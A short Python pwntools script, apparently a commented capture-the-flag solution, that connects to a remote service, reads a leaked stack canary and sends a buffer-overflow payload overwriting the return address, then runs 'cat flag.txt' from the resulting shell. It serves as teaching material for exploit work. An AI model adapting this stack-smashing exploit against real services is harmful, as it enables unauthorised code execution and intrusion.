from pwn import *

URL = "example.com"
PORTNUM = 5000

p = remote(URL, PORTNUM)
context.bits =  64 # or 32

p.sendline(b'a') # this is how to send a line

p.recvuntil(b'Stack Canary\t\t: ') # this is how to tell it to wait/receive until a string
canary = p64(int(p.recvline().strip(), 16))
p.sendline(b'Y')
payload = flat(b'A'*24,canary,b'A'*8,0x400bea) #Flattens the arguments into a string. 
# (trick to combine utf-8, hex etc)
print(payload)
p.sendline(payload) # since payload is already in b'bytestring'
p.sendline('N')
p.sendline('cat flag.txt') # once we have gotten a shell
p.interactive() # useful for debug purposes, lets us enter the connection in the terminal
#everything from here onwards will not run